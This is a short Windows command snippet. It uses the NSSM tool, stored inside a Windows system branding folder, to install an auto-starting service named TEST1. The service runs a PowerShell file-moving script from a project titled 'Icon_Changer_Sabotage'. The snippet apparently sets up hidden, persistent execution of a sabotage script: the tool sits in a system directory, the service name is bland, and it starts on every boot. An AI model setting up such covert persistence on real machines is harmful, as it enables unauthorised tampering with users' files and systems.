cd C:\Windows\Branding\shellbrd\nssm-2.24\win64
.\nssm.exe install TEST1 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -file "G:\Admin\Documents\GitHub\Icon_Changer_Sabotage\powershell_script\movefiles.ps1"
.\nssm.exe set TEST1 Start SERVICE_AUTO_START
